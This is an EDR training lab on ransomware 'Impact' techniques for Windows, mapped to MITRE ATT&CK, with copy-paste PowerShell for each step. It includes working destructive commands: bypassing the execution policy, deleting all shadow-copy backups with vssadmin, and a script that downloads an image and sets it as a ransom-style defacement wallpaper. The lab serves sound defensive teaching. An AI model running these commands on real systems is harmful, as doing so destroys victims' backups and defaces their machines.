---
Title: ATT&CK - Impact Phase
Description: Introduce post-compromise attack behaviors and EDR defenses
Author: Chris Gerritz, Datto
Created: 04/17/2025
Achievements:
Duration: 10
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
- SysInternals
- LibreOffice
- Gimp
External:
- attack.mitre.org
- rightofboom.infocyte.com
- infocyte-support.s3.us-east-2.amazonaws.com/extension-utilities/wallpaper.jpg
---

## Description

The purpose of these labs is to introduce post-compromise attack behaviors and EDR defenses. We will perform post-compromise behaviors that an attacker would run once they compromised a system within the network.  This system has Datto EDR installed for monitoring so we will be able to view these commands from the defender's perspective as well.

The Impact phase of an attack consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. 

In order for a ransom to be effective, skilled attackers often wait till they have total control of a network and pre-stage their ransomware on every system so that it can be initiated all at once on every system with security tooling and backup software disabled.


## Objectives
<!--
- List all objectives for this lab
- Need at least three objectives
- Use blooms taxonomy verbs 
-->
1. Understand the Impact phase of an attack
2. Demonstrate some system changes common during this phase
   

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows |
| **Applications** | All applications needed     |
| **Needed Files** | None |


## Preparation Instructions

Ignore this if you already ran it in a previous lab and are re-using the same Powershell window.

1. Open powershell as an administrator
	- Right click Powershell
	- Click "Run as Administrator"
2. Prepare the enviroment with some variables we will use later
	- Run the following:
	```PowerShell
	#Define a random number (This will be used to force Datto EDR not to deduplicate repeated commands during testing)
	$n = 1000+$(Get-Random -Max 999)
	# Bypass signed script controls
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
	```

## Instructions
For each of these labs, you will need your Powershell window open. You can use the same window for all labs. You will be copying and pasting commands into the terminal and then evaluating the output.

w> All labs require you to be running as an administrator. 

### 1. Inhibit System Recovery
> *Ransomware's purpose is to restrict access to data by encrypting it till the victim pays the ransom. Inhibiting the ability to restore from backup is essential to making sure the attacker achieves this objective.*
>
> *The method we'll demonstrate today is common in all ransomware attacks: deleting the shadowcopy backups.  The shadowcopy, when enabled, stores copies of any files modified and is the basis for some ransomware rollback software.*

Delete the shadow copy backups to perform **Inhibit System Recovery** technique
- MITRE ATT&CK Technique: [ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)
- Copy and paste this command into the terminal:
	```PowerShell
	# Shadow Copy Deletion
	Write-Host -ForegroundColor Cyan "Initiating technique T1490 - Inhibit System Recovery"
	vssadmin.exe delete shadows /All /quiet 2>&1
	```

### 2. Wallpaper Defacement
> *An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. In ransomware, the wallpaper will be changed to give the user instructions and make their demands*

Execute a **Wallpaper Defacement** by changing the background to a ransomware message. 
- MITRE ATT&CK Technique: [ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)
- Copy and paste this command into the terminal:
```PowerShell
(Get-ItemProperty 'HKCU:\Control Panel\Desktop').WallPaper | Set-Content "$env:TEMP\original_wallpaper.txt"

powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -Command {
    Write-Host -ForegroundColor Cyan "Initiating technique T1491 - Defacement: Internal Defacement";
    Start-Sleep -Seconds 2;

    $wallpaperURL = "https://infocyte-support.s3.us-east-2.amazonaws.com/extension-utilities/wallpaper.jpg";
    $wallpaperPath = "$env:temp\wallpaper.jpg";

    Invoke-WebRequest $wallpaperURL -OutFile $wallpaperPath;
    Start-Sleep -Milliseconds 1000;

    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value 10;
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value 0;

    Add-Type -TypeDefinition @'
        using System;
        using System.Runtime.InteropServices;
        public class Params {
            [DllImport("user32.dll", CharSet = CharSet.Unicode)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
'@;

    $UpdateIniFile = 0x01;
    $SendChangeEvent = 0x02;
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent;

    [Params]::SystemParametersInfo(0x0014, 0, $wallpaperPath, $fWinIni);
}
```
- [Optional] Restore:
```Powershell
powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -Command {
    $oldPath = Get-Content "$env:TEMP\original_wallpaper.txt"
    Write-Host -ForegroundColor Cyan "Restoring original wallpaper...";
    Start-Sleep -Seconds 2;

    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value 10;
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value 0;

    Add-Type -TypeDefinition @'
        using System;
        using System.Runtime.InteropServices;
        public class Params {
            [DllImport("user32.dll", CharSet = CharSet.Unicode)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
'@;

    $UpdateIniFile = 0x01;
    $SendChangeEvent = 0x02;
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent;

    [Params]::SystemParametersInfo(0x0014, 0, $oldPath, $fWinIni);
    Write-Host -ForegroundColor Green "Wallpaper restored to: $oldPath";
}
```